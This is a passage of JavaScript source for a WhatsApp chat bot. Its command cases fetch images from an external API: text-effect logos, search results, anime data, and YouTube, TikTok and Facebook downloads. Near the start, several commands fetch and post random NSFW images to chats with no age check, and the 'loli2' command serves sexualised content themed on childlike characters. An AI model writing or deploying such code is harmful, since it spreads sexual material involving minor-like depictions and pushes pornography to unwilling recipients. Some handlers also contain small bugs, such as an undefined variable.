await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "waifu3":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/waifu?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "loli2":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/loli?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "trap2":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/trap?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "blowjob2":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/blowjob?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "hentai2":
try{
if (m.isGroup && !isSewa) return onlySewa()
let result = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai?apikey=${lolhumankey}`)
let buttons = [{ buttonId: `${prefix + command}`, buttonText: { displayText: `➡️Next` }, type: 1 }]
await sock.sendMessage(m.chat, { image: result, caption: mess.success, footer: copyrightnya, buttons: buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
//=========================[ FITURE TEXT PROME ]=========================\\
case "neon":
case "greenneon":
case "futureneon":
case "sandwriting":
case "sandsummer":
case "sandengraved":
case "metaldark":
case "neonlight":
case "holograph":
case "text1917":
case "minion":
case "deluxesilver":
case "newyearcard":
case "bloodfrosted":
case "halloween":
case "jokerlogo":
case "fireworksparkle":
case "bokeh":
case "toxic":
case "strawberry":
case "box3d":
case "roadwarning":
case "breakwall":
case "icecold":
case "luxury":
case "cloud":
case "summersand":
case "horrorblood":
case "thunder":
case "magma":
case "impressiveglitch":
case "watercolor":
case "wonderfulgraffiti":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text) 
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/${command}?apikey=${lolhumankey}&text=${encodeURI(text)}` }, caption: mess.success, footer: copyrightnya }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "blackping":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text) 
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/textprome/blackpink?apikey=${lolhumankey}&text=${encodeURI(text)}` }, caption: mess.success, footer: copyrightnya }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
//=========================[ FITURE EPHOTO360 ]=========================\\
case "shadow":
case "cup":
case "cup1":
case "romance":
case "smoke":
case "burnpaper":
case "lovemessage":
case "undergrass":
case "love":
case "coffe":
case "woodheart":
case "summer3d":
case "wolfmetal":
case "nature3d":
case "underwater":
case "golderrose":
case "summernature":
case "fallleaves":
case "flamming":
case "harrypotter":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text) 
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolhumankey}&text=${encodeURI(text)}` }, caption: mess.success, footer: copyrightnya }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "tiktokmaker":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text) 
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/photooxy1/tiktok?apikey=${lolhumankey}&text=${encodeURI(text)}` }, caption: mess.success, footer: copyrightnya }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "wetglass":
case "multicolor3d":
case "luxurygold":
case "galaxywallpaper":
case "lighttext":
case "beautifulflower":
case "puppycute":
case "royaltext":
case "heartshaped":
case "birthdaycake":
case "galaxystyle":
case "hologram3d":
case "glossychrome":
case "greenbush":
case "metallogo":
case "noeltext":
case "glittergold":
case "textcake":
case "starsnight":
case "wooden3d":
case "textbyname":
case "writegalacy":
case "galaxybat":
case "snow3d":
case "birthdayday":
case "goldplaybutton":
case "silverplaybutton":
case "freefire":
case "cartoongravity":
case "anonymhacker":
case "mlwall":
case "pubgmaskot":
case "aovwall":
case "fpslogo":
case "avatarlolnew":
case "lolbanner":
case "avatardota":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text) 
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolhumankey}&text=${encodeURI(text)}` }, caption: mess.success, footer: copyrightnya }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "greenneon2":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text) 
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/greenneon?apikey=${lolhumankey}&text=${encodeURI(text)}` }, caption: mess.success, footer: copyrightnya }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "watercolor2":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text)
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/ephoto1/watercolor?apikey=${lolhumankey}&text=${encodeURI(text)}` }, caption: mess.success, footer: copyrightnya }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
//=========================[ FITURE SEARCH ]=========================\\
case "yts":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.yts.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${lolhumankey}&query=${encodeURI(text)}`) 
let listSerch = []
for (let x of data.result) {
listSerch.push({
title: x.title,
rowId: `${prefix}ytmp3 https://www.youtube.com/watch?v=${x.videoId}`,
description: `Published : ${x.published}\nViews : ${x.views}`
})
}
const sections = [
{title: "Total Search🔍" + data.result.length,
rows: listSerch }]
const listMessage = {
text: `📂Youtube Search by ${db.data.settings[botNumber].namabot} Md`,
buttonText: "Click Here",
sections
}
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "spotifysearch":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.spotifysearch.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/spotifysearch?apikey=${lolhumankey}&query=${encodeURI(text)}`) 
let listSerch = []
for (let x of data.result) {
listSerch.push({
title: x.title,
rowId: `${prefix}spotify ${x.link}`,
description: `Artists : ${x.artists}`
})
}
const sections = [
{title: "Total Search🔍" + data.result.length,
rows: listSerch }]
const listMessage = {
text: `📂Spotify Search by ${db.data.settings[botNumber].namabot} Md`,
buttonText: "Click Here",
sections
}
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "pinterest":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.pinterest.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/pinterest?apikey=${lolhumankey}&query=${encodeURI(text)}`)
sock.sendMessage(m.chat, { image: { url: data.result }, caption: mess.success }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "pixiv":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.pixiv.query(prefix, command))
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/pixiv?apikey=${lolhumankey}&query=${encodeURI(text)}` }, caption: mess.success }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "stickerwa":
try{ 
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text)
let { data } = await axios.get(`http://api.lolhuman.xyz/api/stickerwa?apikey=${lolhumankey}&query=${encodeURI(text)}`)
for(let x of data.result[0].stickers) {
sock.sendMessage(m.chat, { sticker: { url: `http://api.lolhuman.xyz/api/convert/towebp?apikey=${lolhumankey}&img=${x}` }})
}
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "gimage":
try{ 
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.gimage.query(prefix, command))
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/gimage?apikey=${lolhumankey}&query=${encodeURI(text)}` } }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "konachan":
try{ 
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.konachan.query(prefix, command))
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/konachan?apikey=${lolhumankey}&query=${encodeURI(text)}` } }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "wallpeper":
try{ 
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.wallpeper.query(prefix, command))
sock.sendMessage(m.chat, { image: { url: `https://api.lolhuman.xyz/api/wallpaper?apikey=${lolhumankey}&query=${encodeURI(text)}` } }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "playstore":
try{ 
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.playstore.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/playstore?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let teks = "Play Store Search :\n\n"
for (let x of data.result) {
teks += `⭔ *Name* : ${x.title}\n`
teks += `⭔ *ID* : ${x.appId}\n`
teks += `⭔ *Developer* : ${x.developer}\n`
teks += `⭔ *Link* : ${x.url}\n`
teks += `⭔ *Price* : ${x.priceText}\n`
teks += `⭔ *Price* : ${x.price}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "shopee":
try{ 
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.shopee.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/shopee?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let teks = "Shopee Search :\n\n"
for (let x of data.result) {
teks += `⭔ *Name* : ${x.name}\n`
teks += `⭔ *Terjual* : ${x.sold}\n`
teks += `⭔ *Stock* : ${x.stock}\n`
teks += `⭔ *Lokasi* : ${x.shop_loc}\n`
teks += `⭔ *Link* : ${x.link_produk}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "google":
try{ 
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.google.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/gsearch?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let teks = "Google Search :\n\n"
for (let x of data.result) {
teks += `⭔ *Title* : ${x.title}\n`
teks += `⭔ *Link* : ${x.link}\n`
teks += `⭔ *Desc* : ${x.desc}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "moddroid":
try{ 
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.moddroid.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/moddroid?apikey=${lolhumankey}&query=${encodeURI(text)}`) 
let teks = "Moddroid Search :\n\n"
for (let x of data.result) {
teks += `⭔ *Name* : ${x.name}\n`
teks += `⭔ *Link* : ${x.link}\n`
teks += `⭔ *Icon* : ${x.icon}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "groupwa":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.groupwa.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/groupwhatsapp?apikey=${lolhumankey}&query=${encodeURI(text)}`) 
let teks = "Group Whatsapp Search :\n\n"
for (let x of data.result) {
teks += `⭔ *Name* : ${x.title}\n`
teks += `⭔ *Link* : ${x.link}\n\n────────────────────────\n\n`
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "character":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.character.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/character?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let teks = `⭔ *Id* : ${data.result.id}\n`
teks += `⭔ *Name* : ${data.result.name.full}\n`
teks += `⭔ *Native* : ${data.result.name.native}\n`
teks += `⭔ *Favorites* : ${data.result.favourites}\n`
teks += `⭔ *Description* : ${data.result.description.replace(/__/g, "_")}\n`
teks += `⭔ *Media* : \n`
for (let x of data.result.media.nodes) {
teks += `- ${x.title.romaji} (${x.title.native})\n`
}
sock.sendMessage(m.chat, { image: { url: data.result.image.large }, caption: teks }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "manga":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.manga.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/manga?apikey=${lolhumankey}&query=${encodeURI(text)}`)
var teks = `⭔ *Id* : ${data.result.id}\n`
teks += `⭔ *Id MAL* : ${data.result.idMal}\n`
teks += `⭔ *Title* : ${data.result.title.romaji}\n`
teks += `⭔ *English* : ${data.result.title.english}\n`
teks += `⭔ *Native* : ${data.result.title.native}\n`
teks += `⭔ *Format* : ${data.result.format}\n`
teks += `⭔ *Chapters* : ${data.result.chapters}\n`
teks += `⭔ *Volume* : ${data.result.volumes}\n`
teks += `⭔ *Status* : ${data.result.status}\n`
teks += `⭔ *Source* : ${data.result.source}\n`
teks += `⭔ *Start Date* : ${data.result.startDate.day} - ${data.result.startDate.month} - ${data.result.startDate.year}\n`
teks += `⭔ *End Date* : ${data.result.endDate.day} - ${data.result.endDate.month} - ${data.result.endDate.year}\n`
teks += `⭔ *Genre* : ${data.result.genres.join(", ")}\n`
teks += `⭔ *Synonyms* : ${data.result.synonyms.join(", ")}\n`
teks += `⭔ *Score* : ${data.result.averageScore}%\n`
teks += `⭔ *Description* : ${data.result.description}\n`
teks += `⭔ *Characters* : \n`
for (let x of data.result.characters.nodes) {
teks += `- ${x.name.full} (${x.name.native})\n`
}
sock.sendMessage(m.chat, { image: { url: data.result.coverImage.large }, caption: teks }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "anime":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.anime.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/anime?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let teks = `⭔ *Id* : ${data.result.id}\n`
teks += `⭔ *Id MAL* : ${data.result.idMal}\n`
teks += `⭔ *Title* : ${data.result.title.romaji}\n`
teks += `⭔ *English* : ${data.result.title.english}\n`
teks += `⭔ *Native* : ${data.result.title.native}\n`
teks += `⭔ *Format* : ${data.result.format}\n`
teks += `⭔ *Episodes* : ${data.result.episodes}\n`
teks += `⭔ *Duration* : ${data.result.duration} mins.\n`
teks += `⭔ *Status* : ${data.result.status}\n`
teks += `⭔ *Season* : ${data.result.season}\n`
teks += `⭔ *Season Year* : ${data.result.seasonYear}\n`
teks += `⭔ *Source* : ${data.result.source}\n`
teks += `⭔ *Start Date* : ${data.result.startDate.day} - ${data.result.startDate.month} - ${data.result.startDate.year}\n`
teks += `⭔ *End Date* : ${data.result.endDate.day} - ${data.result.endDate.month} - ${data.result.endDate.year}\n`
teks += `⭔ *Genre* : ${data.result.genres.join(", ")}\n`
teks += `⭔ *Synonyms* : ${data.result.synonyms.join(", ")}\n`
teks += `⭔ *Score* : ${data.result.averageScore}%\n`
teks += `⭔ *Description* : ${data.result.description}\n`
teks += `⭔ *Characters* : \n`
for (var x of data.result.characters.nodes) {
teks += `- ${x.name.full} (${x.name.native})\n`
}
sock.sendMessage(m.chat, { image: { url: data.result.coverImage.large }, caption: teks }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "kusonimesearch":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.kusonimesearch.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let teks = `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Japanese* : ${data.result.japanese}\n`
teks += `⭔ *Genre* : ${data.result.genre}\n`
teks += `⭔ *Seasons* : ${data.result.seasons}\n`
teks += `⭔ *Producers* : ${data.result.producers}\n`
teks += `⭔ *Type* : ${data.result.type}\n`
teks += `⭔ *Status* : ${data.result.status}\n`
teks += `⭔ *Total Episode* : ${data.result.total_episode}\n`
teks += `⭔ *Score* : ${data.result.score}\n`
teks += `⭔ *Duration* : ${data.result.duration}\n`
teks += `⭔ *Released On* : ${data.result.released_on}\n`
teks += `⭔ *Desc* : ${data.result.desc}\n`
for (var x in data.result.link_dl) {
teks += `\n${x}\n`
for (var y in link_dl[x]) {
teks += `${y} - ${link_dl[x][y]}\n`
}
}
sock.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption: teks }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "otakudesusearch":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.kusonimesearch.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let teks = `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Japanese* : ${data.result.japanese}\n`
teks += `⭔ *Judul* : ${data.result.judul}\n`
teks += `⭔ *Type* : ${data.result.type}\n`
teks += `⭔ *Episode* : ${data.result.episodes}\n`
teks += `⭔ *Aired* : ${data.result.aired}\n`
teks += `⭔ *Producers* : ${data.result.producers}\n`
teks += `⭔ *Genre* : ${data.result.genres}\n`
teks += `⭔ *Duration* : ${data.result.duration}\n`
teks += `⭔ *Studios* : ${data.result.status}\n`
teks += `⭔ *Rating* : ${data.result.rating}\n`
teks += `⭔ *Credit* : ${data.result.credit}\n`
for (var x in data.result.link_dl) {
teks += `\n\n*${data.result.link_dl[x].title}*\n`
for (var y in data.result.link_dl[x].link_dl) {
var info = data.result.link_dl[x].link_dl[y]
teks += `\n⭔ *Reso* : ${info.reso}\n`
teks += `⭔ *Size* : ${info.size}\n`
teks += `⭔ *Link* : \n`
var link = info.link_dl
for (var z in link) {
teks += `${z} - ${link[z]}\n`
}
}
}
setReply(teks)
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
//=========================[ FITURE DOWNLOAD ]=========================\\
case "play":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.play.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${lolhumankey}&query=${encodeURI(text)}`)
let result = sock.pickRandom(data.result)
let buttons = [
{ buttonId: `${prefix}ytmp3 https://www.youtube.com/watch?v=${result.videoId}`, buttonText: { displayText: "audio" }, type: 1 },
{ buttonId: `${prefix}ytmp4 https://www.youtube.com/watch?v=${result.videoId}`, buttonText: { displayText: "video" }, type: 1 }]
let teks = "Youtube Play :\n\n"
teks += `⭔ *Title* : ${result.title}\n`
teks += `⭔ *Views* : ${result.views}\n`
teks += `⭔ *Published* : ${result.published}\n`
teks += `⭔ *Thumbnail* : ${result.thumbnail}\n`
teks += `⭔ *Link* : https://www.youtube.com/watch?v=${result.videoId}`
sock.sendMessage(m.chat, { image: { url: result.thumbnail }, caption: teks, buttons: buttons }, { quoted: setQuoted }) 
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "ytmp3":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.ytmp3.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/ytaudio?apikey=${lolhumankey}&url=${args[0]}`)
let teks = "Youtube Audio :\n\n"
teks += `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Channel* : ${data.result.channel}\n`
teks += `⭔ *Duration* : ${data.result.duration}\n`
teks += `⭔ *Views* : ${data.result.view}\n`
teks += `⭔ *Like* : ${data.result.like}`
sock.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption: teks }, { quoted: setQuoted })
sock.sendMessage(m.chat, { audio: { url: data.result.link.link }, mimetype: "audio/mp4", fileName: `${data.result.title}.mp3` }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "ytmp4":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.ytmp4.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/ytvideo?apikey=${lolhumankey}&url=${args[0]}`)
let teks = "Youtube Video :\n\n"
teks += `⭔ *Title* : ${data.result.title}\n`
teks += `⭔ *Channel* : ${data.result.channel}\n`
teks += `⭔ *Duration* : ${data.result.duration}\n`
teks += `⭔ *Views* : ${data.result.view}\n`
teks += `⭔ *Like* : ${data.result.like}`
sock.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption: teks }, { quoted: setQuoted })
sock.sendMessage(m.chat, { video: { url: data.result.link.link }, mimetype: "video/mp4", fileName: `${data.result.title}.mp4` }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "cocofun":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.cocofun.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/cocofun?apikey=${lolhumankey}&url=${args[0]}`)
sock.sendMessage(m.chat, { video: { url: data.result.nowm }, mimetype: "video/mp4", caption: mess.success }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "fbdl":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.fbdl.query(prefix, command))
let { data } = await axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${lolhumankey}&url=${args[0]}`)
sock.sendMessage(m.chat, { video: { url: data.result }, mimetype: "video/mp4", caption: mess.success }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "tiktok":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.tiktok.query(prefix, command))
if (text.includes("https://vt.tiktok.com/")){
var link = args[0]
} else if (text.includes("https://vm.tiktok.com/")){
var link = args[0]
} else if (text.includes("https://www.tiktok.com/")){
var link = args[0]
} else setReply(mess.error.link)
let buttons = [{ buttonId: `${prefix}tiktokmp3 ${link}`, buttonText: { displayText: "audio" }, type: 1 }]
let { data } = await axios.get(`https://api.lolhuman.xyz/api/tiktok2?apikey=${lolhumankey}&url=${link}`)
sock.sendMessage(m.chat, { video: { url: data.result }, mimetype: "video/mp4", caption: mess.success, buttons }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "tiktokmp3":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.tiktokmp3.query(prefix, command))
if (text.includes("https://vt.tiktok.com/")){
var link = args[0]
} else if (text.includes("https://vm.tiktok.com/")){
var link = args[0]
} else if (text.includes("https://www.tiktok.com/")){
var link = args[0]
} else setReply(mess.error.link)
sock.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/tiktokmusic?apikey=${lolhumankey}&url=${link}` }, mimetype: "audio/mp4" }, { quoted: setQuoted })
} catch {
sock.sendButMessage(m.chat, mess.error.fitur, copyrightnya, [{ buttonId: `${prefix}devoloper`, buttonText: { displayText: "devoloper" }, type: 1 }], setQuoted)
}
break
case "igdl":
try{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.cmd.igdl.query(prefix, command))
